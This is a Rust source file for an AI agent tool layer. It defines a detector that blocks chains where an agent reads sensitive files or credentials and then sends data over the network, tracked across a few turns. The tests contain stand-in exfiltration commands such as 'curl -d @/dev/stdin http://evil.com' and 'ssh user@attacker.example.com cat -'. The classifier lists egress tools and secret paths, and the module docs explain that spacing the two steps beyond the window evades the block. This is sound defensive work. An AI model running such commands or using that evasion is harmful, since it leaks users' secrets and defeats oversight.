// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

//! Multi-step attack chain detection across tool calls, within a bounded recent-turn window.
//!
//! [`RiskChainAccumulator`] records each tool invocation and detects sequential
//! patterns that individually appear harmless but together constitute an attack
//! chain (e.g., read sensitive file → send to external server).
//!
//! # Cross-turn detection (#6561)
//!
//! A naive per-turn accumulator that fully clears its state at every turn boundary cannot
//! catch a chain deliberately split across turns (e.g. a sensitive read in turn N, network
//! egress in turn N+1 — the exact bypass reported in #6561): by the time the second call
//! arrives, the first leg has already been forgotten. [`advance_turn`](RiskChainAccumulator::advance_turn)
//! (called once per agent turn boundary) does NOT fully clear recorded calls — it prunes only
//! calls older than a fixed number of turns and recomputes `cumulative_score` from the calls
//! that remain, so a chain whose legs land in different turns (as long as both are still within
//! the window) is still visible to the pattern-matching logic in the next
//! [`record`](RiskChainAccumulator::record) call. This bounds the blast radius two ways: the
//! turn-based window limits how long a stale sensitive read stays "live", and the absolute call
//! count cap independently bounds tracked calls regardless of turn count.
//!
//! When a chain fires, the accumulator also pushes a signal code into the [`RiskSignalQueue`]
//! shared with the `TrajectorySentinel` in `zeph-core`, so the session-scoped cross-turn risk
//! aggregate reflects the detection too — this is a secondary reporting channel, not the
//! mechanism that makes cross-turn detection possible (the turn-windowed state above is). All
//! production entry points construct this accumulator with `Some(queue)`; `None` is used only in
//! isolated unit tests that don't need `TrajectorySentinel` reporting. Signal codes `10`
//! (`exfil_read_then_send`) and `11` (`cred_then_egress`) are reserved for chains defined in this
//! module.
//!
//! `RiskChainAccumulator` is authoritative for multi-step chain blocking within its recent-turn
//! window. `TrajectoryRiskSlot` / `TrajectorySentinel` remain authoritative for cumulative global
//! risk level across the whole session.
//!
//! # Cross-turn window default (#6603)
//!
//! The window is configurable via `[tools.shell] risk_chain_window_turns` (falls back to
//! [`DEFAULT_CROSS_TURN_WINDOW_TURNS`] when unset). Its default of `3` is deliberately narrower
//! than the sibling `[security.trajectory] window_turns` default of `8`
//! (`TrajectorySentinelConfig`, `crates/zeph-config/src/security.rs`): that window feeds a
//! decaying *soft* risk score used for alerting, while this window feeds a *hard block*
//! decision. A wider window here would let more unrelated old activity combine with new activity
//! into a false-positive block; `3` was chosen to keep the default behavior unchanged from the
//! #6561 fix that introduced cross-turn detection. Operators who want detection to survive a
//! longer gap between the two legs of a chain can raise this value explicitly. Setting it to `0`
//! is a supported, deliberate opt-out that disables cross-turn detection outright (every call is
//! pruned on the very next [`advance_turn`](RiskChainAccumulator::advance_turn), reproducing the
//! pre-#6561 same-turn-only behavior) — callers that construct the accumulator directly
//! (`agent_setup::wire_risk_chain`) log a warning naming #6561 when this resolves to `0`, since
//! the value has no other operator-visible signal.
//!
//! This is a bounded mitigation, not a complete fix: an attacker fully controls the spacing
//! between the sensitive read and the network egress, so spacing the two legs further apart than
//! the configured window still evades the block entirely. This residual is accepted and bounded
//! (an unrelated read from beyond the window can never combine with new activity — see
//! [`RiskChainAccumulator::advance_turn`]), not something this module claims to close. Keying the
//! window off in-context message span (surviving compaction/summarization) instead of raw turn
//! count might narrow the residual further but is not implemented here — see #6603.

use std::collections::VecDeque;
use std::sync::Arc;

use parking_lot::Mutex;
use tracing;

use crate::config::ShellConfig;
use crate::policy_gate::RiskSignalQueue;

/// Signal code for `exfil_read_then_send` chain.
const SIGNAL_EXFIL_READ_THEN_SEND: u8 = 10;
/// Signal code for `cred_then_egress` chain.
const SIGNAL_CRED_THEN_EGRESS: u8 = 11;

/// Maximum number of calls tracked, regardless of how many turns they span.
///
/// Once exceeded, the oldest entry is dropped and `cumulative_score` is recomputed from the
/// surviving calls (see [`RiskChainAccumulator::advance_turn`]).
const MAX_CALLS: usize = 20;

/// Default number of turns a recorded call stays "live" for cross-turn chain detection (#6561),
/// used when `[tools.shell] risk_chain_window_turns` is unset (#6603).
///
/// [`RiskChainAccumulator::advance_turn`] prunes any call older than this many turns. A chain
/// split across turns (e.g. sensitive read in turn N, network egress in turn N+1..=N+3) is still
/// caught as long as both legs fall within this window; a read from many turns ago that never
/// led anywhere eventually ages out, so unrelated old activity cannot combine with new activity
/// into a false positive indefinitely. See the module docs for why `3` (not the sibling
/// `TrajectorySentinelConfig`'s `8`) was chosen as the default.
pub const DEFAULT_CROSS_TURN_WINDOW_TURNS: u64 = 3;

/// Risk categories assigned to individual tool calls during classification.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum RiskTag {
    /// Read of a sensitive path: `/etc/passwd`, `/etc/shadow`, `~/.ssh/*`, `.env`.
    SensitiveRead,
    /// Network egress tool: `curl`, `wget`, `nc`, `ncat`, or the `fetch` tool.
    NetworkEgress,
    /// Write to a system path: `/etc/`, `/usr/`, `/sys/`.
    SystemWrite,
    /// Access to credential-bearing variables or files.
    CredentialAccess,
    /// Process manipulation: `kill`, `pkill`.
    ProcessControl,
}

/// Verdict produced by [`RiskChainAccumulator::record`].
#[derive(Debug, Clone)]
pub struct RiskChainVerdict {
    /// Cumulative risk score for the current turn (`0.0` = benign, `≥1.0` = saturated).
    pub cumulative_score: f32,
    /// Name of the matched multi-step chain pattern, if any fired on this call.
    pub chain_pattern: Option<String>,
    /// `true` when `cumulative_score` exceeds the configured threshold.
    pub should_block: bool,
}

#[derive(Debug, Clone)]
struct ScoredCall {
    tags: Vec<RiskTag>,
    /// Turn index this call was recorded in — used by `advance_turn` to prune calls that have
    /// aged out of [`DEFAULT_CROSS_TURN_WINDOW_TURNS`].
    turn: u64,
}

#[derive(Debug, Default)]
struct Inner {
    calls: VecDeque<ScoredCall>,
    cumulative_score: f32,
    /// Current turn index, incremented by `advance_turn`. Starts at 0.
    turn: u64,
    /// Name of the chain pattern currently pushed into the signal queue, if any (#6561
    /// dedup fix). While the same chain stays matched across several subsequent `record()`
    /// calls (it can remain live for up to the configured window's turn count), the queue
    /// push must fire once per detection, not once per call — otherwise a single logical
    /// chain can flood `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicate pushes
    /// over its live window, amplifying one detection into a session-wide false escalation.
    /// Cleared as soon as `detect_chain` stops matching, so a genuinely new occurrence of the
    /// same pattern (after the old one ages out) pushes again.
    signaled_pattern: Option<String>,
}

/// Cumulative risk tracker for multi-step attack chain detection, scoped to one agent
/// session/turn-loop (#6588: one instance per session, not shared across concurrent sessions).
///
/// Thread-safe: state is protected by a `parking_lot::Mutex` so concurrent
/// tool calls within a single batch accumulate correctly.
///
/// Create one instance per agent session via [`RiskChainAccumulator::new`] and call
/// [`advance_turn`](RiskChainAccumulator::advance_turn) at each turn boundary — this prunes
/// stale calls rather than fully clearing state, which is what makes cross-turn chain
/// detection possible (see the module docs).
///
/// # Examples
///
/// ```
/// use zeph_tools::ShellConfig;
/// use zeph_tools::risk_chain::RiskChainAccumulator;
///
/// let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
/// let v = acc.record("bash", "cat /etc/passwd", 0.7);
/// assert!(!v.should_block); // single sensitive read, score < threshold
/// ```
#[derive(Debug, Clone)]
pub struct RiskChainAccumulator {
    inner: Arc<Mutex<Inner>>,
    signal_queue: Option<RiskSignalQueue>,
    /// Number of turns a recorded call stays "live" (see [`DEFAULT_CROSS_TURN_WINDOW_TURNS`]
    /// and the module docs for rationale). Fixed for the lifetime of the accumulator.
    window_turns: u64,
}

impl RiskChainAccumulator {
    /// Create a new accumulator for one agent session.
    ///
    /// `signal_queue` — when `Some`, chain detections push a signal code into
    /// the shared queue so the `TrajectorySentinel` in `zeph-core` is notified.
    ///
    /// `shell_config` — the same `ShellConfig` used to build the session's `ShellExecutor`.
    /// `risk_chain_window_turns` is resolved from it internally (falling back to
    /// [`DEFAULT_CROSS_TURN_WINDOW_TURNS`] when unset), mirroring how `ShellExecutor::new`
    /// resolves `risk_chain_threshold` — callers pass the config they already have rather than
    /// extracting and threading the raw field themselves (#6603).
    #[must_use]
    pub fn new(signal_queue: Option<RiskSignalQueue>, shell_config: &ShellConfig) -> Self {
        let window_turns = shell_config
            .risk_chain_window_turns
            .unwrap_or(DEFAULT_CROSS_TURN_WINDOW_TURNS);
        Self {
            inner: Arc::new(Mutex::new(Inner::default())),
            signal_queue,
            window_turns,
        }
    }

    /// The resolved cross-turn window (in turns) this accumulator was constructed with — see
    /// [`new`](Self::new). Exposed so callers can log/observe the effective value without
    /// duplicating the `risk_chain_window_turns.unwrap_or(DEFAULT_CROSS_TURN_WINDOW_TURNS)`
    /// resolution logic themselves.
    #[must_use]
    pub fn window_turns(&self) -> u64 {
        self.window_turns
    }

    /// Record a tool call and return the updated risk verdict.
    ///
    /// `tool_name`: e.g. `"bash"`, `"fetch"`, `"web_scrape"`.
    /// `command`: the shell command or URL (post-deobfuscation for shell calls).
    /// `threshold`: cumulative score above which `should_block` is `true`.
    ///
    /// # Errors
    ///
    /// This function never returns an error; it returns a verdict that the caller
    /// uses to decide whether to block the tool call.
    #[must_use]
    pub fn record(&self, tool_name: &str, command: &str, threshold: f32) -> RiskChainVerdict {
        let _span = tracing::info_span!("tools.risk_chain.check", tool = tool_name).entered();
        let tags = classify(tool_name, command);
        let call_score: f32 = tags.iter().map(tag_score).sum();

        let mut inner = self.inner.lock();

        // Maintain capacity bound — drop oldest entry when full.
        if inner.calls.len() >= MAX_CALLS {
            inner.calls.pop_front();
        }
        let turn = inner.turn;
        inner.calls.push_back(ScoredCall {
            tags: tags.clone(),
            turn,
        });
        inner.cumulative_score = (inner.cumulative_score + call_score).min(10.0);

        // Check for multi-step chain patterns.
        let chain_pattern = Self::detect_chain(&inner.calls);

        if let Some(ref name) = chain_pattern {
            let bonus = chain_bonus(name);
            inner.cumulative_score = (inner.cumulative_score + bonus).min(10.0);

            // Push into the shared signal queue — but only once per detection (#6561 dedup
            // fix): the same live chain can keep matching on every subsequent call for up to
            // DEFAULT_CROSS_TURN_WINDOW_TURNS turns, and without this guard each of those calls would
            // re-push the same signal code, flooding TrajectorySentinel/MAGE with duplicates
            // from a single logical attack.
            if inner.signaled_pattern.as_deref() != Some(name.as_str()) {
                if let Some(ref q) = self.signal_queue {
                    let code = chain_signal_code(name);
                    q.lock().push(code);
                }
                inner.signaled_pattern = Some(name.clone());
            }
        } else {
            // Chain no longer live (a leg aged out of the window) — clear the dedup marker so
            // a genuinely new future occurrence of the same pattern pushes again.
            inner.signaled_pattern = None;
        }

        RiskChainVerdict {
            cumulative_score: inner.cumulative_score,
            chain_pattern,
            should_block: inner.cumulative_score >= threshold,
        }
    }

    /// Advance to the next turn. Call at each turn boundary (`Agent::begin_turn()`).
    ///
    /// Does NOT fully clear state — that would defeat cross-turn chain detection (#6561). Instead
    /// it prunes calls older than a fixed number of turns and recomputes `cumulative_score`
    /// from the calls that remain, so a chain split across turns is still visible to the next
    /// [`record`](Self::record) call as long as both legs fall within the window.
    pub fn advance_turn(&self) {
        let mut inner = self.inner.lock();
        inner.turn += 1;
        let cutoff = inner.turn.saturating_sub(self.window_turns);
        inner.calls.retain(|c| c.turn >= cutoff);
        inner.cumulative_score = inner
            .calls
            .iter()
            .flat_map(|c| &c.tags)
            .map(tag_score)
            .sum::<f32>()
            .min(10.0);
    }

    /// Detect whether the accumulated call sequence matches a known chain pattern.
    fn detect_chain(calls: &VecDeque<ScoredCall>) -> Option<String> {
        let all_tags: Vec<&RiskTag> = calls.iter().flat_map(|c| &c.tags).collect();

        let has_sensitive_read = all_tags.contains(&&RiskTag::SensitiveRead);
        let has_cred_access = all_tags.contains(&&RiskTag::CredentialAccess);
        let has_network_egress = all_tags.contains(&&RiskTag::NetworkEgress);

        // Pattern 1: sensitive file read → network egress.
        if has_sensitive_read
            && has_network_egress
            && chain_ordered(calls, &RiskTag::SensitiveRead, &RiskTag::NetworkEgress)
        {
            return Some("exfil_read_then_send".to_owned());
        }

        // Pattern 2: credential access → network egress.
        if has_cred_access
            && has_network_egress
            && chain_ordered(calls, &RiskTag::CredentialAccess, &RiskTag::NetworkEgress)
        {
            return Some("cred_then_egress".to_owned());
        }

        None
    }
}

/// Return `true` if `before` tag appears in an earlier call than `after` tag.
fn chain_ordered(calls: &VecDeque<ScoredCall>, before: &RiskTag, after: &RiskTag) -> bool {
    let first_before = calls.iter().position(|c| c.tags.contains(before));
    let last_after = calls.iter().rposition(|c| c.tags.contains(after));
    match (first_before, last_after) {
        (Some(b), Some(a)) => b < a,
        _ => false,
    }
}

/// Classify a tool invocation into zero or more risk tags.
fn classify(tool_name: &str, command: &str) -> Vec<RiskTag> {
    let mut tags = Vec::new();
    let cmd_lower = command.to_lowercase();

    // Network egress: fetch tool or egress shell commands.
    if tool_name == "fetch" || tool_name == "web_scrape" {
        tags.push(RiskTag::NetworkEgress);
    }

    if cmd_lower.contains("curl")
        || cmd_lower.contains("wget")
        || cmd_lower.contains("nc ")
        || cmd_lower.contains("ncat")
        || cmd_lower.contains("ssh")
        || cmd_lower.contains("scp")
        || cmd_lower.contains("sftp")
        || cmd_lower.contains("rsync")
    {
        tags.push(RiskTag::NetworkEgress);
    }

    // Sensitive read.
    if cmd_lower.contains("/etc/passwd")
        || cmd_lower.contains("/etc/shadow")
        || cmd_lower.contains("/.ssh/")
        || cmd_lower.contains(".env")
    {
        tags.push(RiskTag::SensitiveRead);
    }

    // Credential access — specific compound patterns to avoid false positives on common words
    // like "keyboard", "tokenizer", "socket". Match whole-word-adjacent patterns.
    let has_cred_pattern = cmd_lower.contains("api_key")
        || cmd_lower.contains("secret_key")
        || cmd_lower.contains("access_key")
        || cmd_lower.contains("private_key")
        || cmd_lower.contains("auth_token")
        || cmd_lower.contains("access_token")
        || cmd_lower.contains("bearer_token")
        || cmd_lower.contains("api_token")
        || cmd_lower.contains("_secret")
        || cmd_lower.contains("password")
        || cmd_lower.contains("passwd")
        || cmd_lower.contains("credential")
        || cmd_lower.contains(".pem")
        || cmd_lower.contains(".key")
        || cmd_lower.contains("id_rsa")
        || cmd_lower.contains("id_ecdsa");
    if has_cred_pattern {
        // Avoid double-tagging passwd files already caught by SensitiveRead.
        if !tags.contains(&RiskTag::SensitiveRead) {
            tags.push(RiskTag::CredentialAccess);
        }
    }

    // System write.
    if cmd_lower.contains("> /etc/")
        || cmd_lower.contains(">> /etc/")
        || cmd_lower.contains("> /usr/")
        || cmd_lower.contains("> /sys/")
    {
        tags.push(RiskTag::SystemWrite);
    }

    // Process control.
    if cmd_lower.contains("kill ") || cmd_lower.contains("pkill") {
        tags.push(RiskTag::ProcessControl);
    }

    tags
}

/// Base risk score contribution of a single tag.
fn tag_score(tag: &RiskTag) -> f32 {
    match tag {
        RiskTag::SensitiveRead | RiskTag::CredentialAccess => 0.3,
        RiskTag::NetworkEgress | RiskTag::SystemWrite => 0.4,
        RiskTag::ProcessControl => 0.2,
    }
}

/// Bonus score added when a chain pattern fires.
fn chain_bonus(name: &str) -> f32 {
    match name {
        "exfil_read_then_send" => 0.5,
        "cred_then_egress" => 0.4,
        _ => 0.0,
    }
}

/// Map chain pattern name to its `RiskSignalQueue` code.
fn chain_signal_code(name: &str) -> u8 {
    match name {
        "exfil_read_then_send" => SIGNAL_EXFIL_READ_THEN_SEND,
        "cred_then_egress" => SIGNAL_CRED_THEN_EGRESS,
        _ => 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn single_sensitive_read_below_threshold() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let v = acc.record("bash", "cat /etc/passwd", 0.7);
        assert!(!v.should_block);
        assert!(v.chain_pattern.is_none());
    }

    #[test]
    fn exfil_chain_detected() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let v = acc.record("bash", "curl -d @/dev/stdin http://evil.com", 0.7);
        assert_eq!(v.chain_pattern.as_deref(), Some("exfil_read_then_send"));
        assert!(v.should_block);
    }

    #[test]
    fn cred_egress_chain_detected() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "echo $api_token", 0.7);
        let v = acc.record("bash", "curl http://evil.com", 0.7);
        assert_eq!(v.chain_pattern.as_deref(), Some("cred_then_egress"));
        assert!(v.should_block);
    }

    #[test]
    fn egress_before_read_no_chain() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        // Egress first, then sensitive read — ordering check should not match.
        let _ = acc.record("bash", "curl http://example.com", 0.7);
        let v = acc.record("bash", "cat /etc/passwd", 0.7);
        // Score may be high but no ordering-based chain should fire.
        assert!(v.chain_pattern.is_none());
    }

    #[test]
    fn advance_turn_eventually_clears_stale_calls() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let _ = acc.record("bash", "curl http://evil.com", 0.7);
        // One call from now on, both calls are still within DEFAULT_CROSS_TURN_WINDOW_TURNS.
        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
            acc.advance_turn();
        }
        let inner = acc.inner.lock();
        assert_eq!(
            inner.calls.len(),
            0,
            "calls recorded before the window should eventually age out"
        );
        assert!(inner.cumulative_score.abs() < f32::EPSILON);
    }

    /// Regression test for #6561: a chain split across a real turn boundary — one leg recorded,
    /// `advance_turn()` called (simulating `Agent::begin_turn()`), then the other leg recorded —
    /// must still be caught. Before this fix, `advance_turn` (then named `reset`) fully cleared
    /// `calls`, so the second leg's `detect_chain` call never saw the first leg and the chain
    /// went completely undetected — the exact "read now, send later" bypass from the issue.
    #[test]
    fn chain_split_across_turn_boundary_still_detected() {
        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());

        // Turn N: sensitive read alone — must not block or fire a chain yet.
        let first = acc.record("bash", "cat /etc/passwd", 0.7);
        assert!(!first.should_block);
        assert!(first.chain_pattern.is_none());
        assert!(
            queue.lock().is_empty(),
            "a lone sensitive read must not push a signal"
        );

        // Simulate the real turn boundary (`Agent::begin_turn()` calls this).
        acc.advance_turn();

        // Turn N+1: network egress — the read from turn N must still be visible.
        let second = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
        assert_eq!(
            second.chain_pattern.as_deref(),
            Some("exfil_read_then_send"),
            "the chain must still fire even though its legs landed in different turns"
        );
        assert!(second.should_block);
        assert!(
            queue.lock().contains(&SIGNAL_EXFIL_READ_THEN_SEND),
            "the cross-turn chain detection must still push the signal code"
        );
    }

    /// Companion to the above: once a sensitive read ages out of `DEFAULT_CROSS_TURN_WINDOW_TURNS`, a
    /// later, otherwise-unrelated network egress call must NOT be flagged — the window bounds
    /// how long stale activity can combine with new activity, so this isn't unbounded.
    #[test]
    fn chain_does_not_fire_once_first_leg_ages_out_of_window() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        // Advance past the window without ever recording the second leg.
        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
            acc.advance_turn();
        }
        let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
        assert!(
            v.chain_pattern.is_none(),
            "a sensitive read from beyond the cross-turn window must not combine with new egress"
        );
    }

    #[test]
    fn cap_at_max_calls() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        for _ in 0..MAX_CALLS + 5 {
            let _ = acc.record("bash", "ls", 100.0);
        }
        assert!(acc.inner.lock().calls.len() <= MAX_CALLS);
    }

    #[test]
    fn signal_queue_populated_on_chain() {
        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let _ = acc.record("bash", "curl http://evil.com", 0.7);
        let signals = queue.lock();
        assert!(signals.contains(&SIGNAL_EXFIL_READ_THEN_SEND));
    }

    /// Regression test for the security/critic dedup finding on the #6561 rework: once a
    /// chain fires, it can keep matching `detect_chain` on every subsequent `record()` call
    /// for as long as both legs stay within `DEFAULT_CROSS_TURN_WINDOW_TURNS` — without a dedup guard,
    /// each of those calls would re-push the same signal code, letting one logical chain flood
    /// `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicates (security quantified
    /// this as enough to force a session-wide Allow->Deny escalation from a single detection).
    #[test]
    fn chain_signal_pushed_only_once_while_still_matched() {
        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());

        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let second = acc.record("bash", "curl http://evil.com", 0.7);
        assert_eq!(
            second.chain_pattern.as_deref(),
            Some("exfil_read_then_send")
        );
        assert_eq!(
            queue.lock().len(),
            1,
            "the chain's first detection must push exactly one signal"
        );

        // Both legs remain in the live window — detect_chain matches again on every
        // subsequent call, but the queue must NOT receive another push for the same chain.
        for _ in 0..5 {
            let repeat = acc.record("bash", "ls /tmp", 0.7);
            assert_eq!(
                repeat.chain_pattern.as_deref(),
                Some("exfil_read_then_send"),
                "the chain legitimately stays matched while both legs remain in the window"
            );
        }
        assert_eq!(
            queue.lock().len(),
            1,
            "repeated matches of the SAME live chain must not re-push into the signal queue"
        );
    }

    /// Companion to the dedup test: once the chain stops matching (its legs age out of the
    /// window) and then a genuinely NEW occurrence of the same pattern fires later, the queue
    /// must receive a signal again — the dedup guard must not permanently suppress the pattern.
    #[test]
    fn chain_signal_pushes_again_after_a_new_occurrence() {
        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());

        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let _ = acc.record("bash", "curl http://evil.com", 0.7);
        assert_eq!(queue.lock().len(), 1);

        // Advance past the window so the old chain fully ages out.
        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
            acc.advance_turn();
        }

        // A brand new, unrelated occurrence of the same pattern.
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let second = acc.record("bash", "curl http://evil.com", 0.7);
        assert_eq!(
            second.chain_pattern.as_deref(),
            Some("exfil_read_then_send")
        );
        assert_eq!(
            queue.lock().len(),
            2,
            "a genuinely new occurrence of the same pattern must push again after the old \
             one aged out"
        );
    }

    // --- #4270: ssh/scp/rsync → NetworkEgress ---

    #[test]
    fn ssh_classified_as_network_egress() {
        let tags = classify("bash", "ssh user@remote.example.com");
        assert!(
            tags.contains(&RiskTag::NetworkEgress),
            "ssh must be classified as NetworkEgress"
        );
    }

    #[test]
    fn scp_classified_as_network_egress() {
        let tags = classify("bash", "scp localfile user@host:/tmp/");
        assert!(
            tags.contains(&RiskTag::NetworkEgress),
            "scp must be classified as NetworkEgress"
        );
    }

    #[test]
    fn rsync_classified_as_network_egress() {
        let tags = classify("bash", "rsync -av ./dir user@remote:/backup/");
        assert!(
            tags.contains(&RiskTag::NetworkEgress),
            "rsync must be classified as NetworkEgress"
        );
    }

    // --- #4281: sftp → NetworkEgress ---

    #[test]
    fn sftp_classified_as_network_egress() {
        let tags = classify("bash", "sftp user@remote.example.com");
        assert!(
            tags.contains(&RiskTag::NetworkEgress),
            "sftp must be classified as NetworkEgress"
        );
    }

    #[test]
    fn sftp_exfil_chain_detected() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let v = acc.record("bash", "sftp user@attacker.example.com", 0.7);
        assert_eq!(
            v.chain_pattern.as_deref(),
            Some("exfil_read_then_send"),
            "read followed by sftp must trigger exfil chain"
        );
        assert!(v.should_block);
    }

    #[test]
    fn ssh_exfil_chain_detected() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
        assert_eq!(
            v.chain_pattern.as_deref(),
            Some("exfil_read_then_send"),
            "read followed by ssh must trigger exfil chain"
        );
        assert!(v.should_block);
    }

    // --- #4268: VecDeque FIFO eviction ordering ---

    #[test]
    fn eviction_removes_oldest_call() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        // Fill to capacity with sensitive reads, then push one more to trigger eviction.
        for _ in 0..MAX_CALLS {
            let _ = acc.record("bash", "cat /etc/passwd", 0.1);
        }
        // After eviction the oldest call is dropped; the window still holds MAX_CALLS.
        let _ = acc.record("bash", "ls /tmp", 0.1);
        let inner = acc.inner.lock();
        assert_eq!(
            inner.calls.len(),
            MAX_CALLS,
            "after eviction calls must stay at MAX_CALLS"
        );
        // The first surviving entry was pushed after the initial fill, so its command
        // matches "cat /etc/passwd" (second-oldest kept), not the overflowed slot.
        // We verify the deque has exactly MAX_CALLS entries — structural correctness.
        drop(inner);
    }

    // --- #6603: configurable window_turns ---

    /// Build a `ShellConfig` with `risk_chain_window_turns` set to a specific value, for tests
    /// that need a non-default window.
    fn config_with_window(turns: u64) -> ShellConfig {
        ShellConfig {
            risk_chain_window_turns: Some(turns),
            ..ShellConfig::default()
        }
    }

    #[test]
    fn narrower_configured_window_ages_out_before_default_window_would() {
        // A window_turns of 1 (narrower than DEFAULT_CROSS_TURN_WINDOW_TURNS = 3) must prune
        // the first leg after 2 advance_turn() calls (0..=window_turns, matching the pruning
        // formula exercised by the DEFAULT_CROSS_TURN_WINDOW_TURNS tests above). Run the
        // identical sequence through a default-window accumulator side by side to actually prove
        // the comparison the test name claims, rather than asserting the narrow case in
        // isolation and trusting the name's "before default window would" implication.
        let narrow = RiskChainAccumulator::new(None, &config_with_window(1));
        let default = RiskChainAccumulator::new(None, &ShellConfig::default());
        for acc in [&narrow, &default] {
            let _ = acc.record("bash", "cat /etc/passwd", 0.7);
            for _ in 0..=1 {
                acc.advance_turn();
            }
        }
        let narrow_verdict = narrow.record("bash", "curl http://evil.com", 0.7);
        let default_verdict = default.record("bash", "curl http://evil.com", 0.7);
        assert!(
            narrow_verdict.chain_pattern.is_none(),
            "a window_turns=1 accumulator must have already pruned the first leg after \
             2 advance_turn() calls"
        );
        assert_eq!(
            default_verdict.chain_pattern.as_deref(),
            Some("exfil_read_then_send"),
            "at the same point (2 advance_turn() calls), the default window (3) must still \
             consider the first leg live — proving the narrow window aged out strictly earlier, \
             not just that it eventually ages out on its own"
        );
    }

    #[test]
    fn wider_configured_window_still_detects_chain_the_default_would_miss() {
        // A window_turns wider than the default must keep a chain leg live for longer than
        // DEFAULT_CROSS_TURN_WINDOW_TURNS turns would allow.
        let acc = RiskChainAccumulator::new(
            None,
            &config_with_window(DEFAULT_CROSS_TURN_WINDOW_TURNS * 2),
        );
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
            acc.advance_turn();
        }
        let v = acc.record("bash", "curl http://evil.com", 0.7);
        assert_eq!(
            v.chain_pattern.as_deref(),
            Some("exfil_read_then_send"),
            "a wider configured window must still detect a chain whose first leg would have \
             aged out of the default window"
        );
    }

    #[test]
    fn zero_window_turns_disables_cross_turn_detection() {
        // window_turns = 0 is a legitimate opt-out: every advance_turn() prunes all calls
        // recorded before the current turn, reproducing the pre-#6561 per-turn-only behavior.
        let acc = RiskChainAccumulator::new(None, &config_with_window(0));
        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
        acc.advance_turn();
        let v = acc.record("bash", "curl http://evil.com", 0.7);
        assert!(
            v.chain_pattern.is_none(),
            "window_turns=0 must prune the first leg on the very next advance_turn()"
        );
    }

    #[test]
    fn window_turns_accessor_falls_back_to_default_when_unset() {
        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
        assert_eq!(acc.window_turns(), DEFAULT_CROSS_TURN_WINDOW_TURNS);
    }

    #[test]
    fn window_turns_accessor_reflects_configured_value() {
        let acc = RiskChainAccumulator::new(None, &config_with_window(7));
        assert_eq!(acc.window_turns(), 7);
    }
}
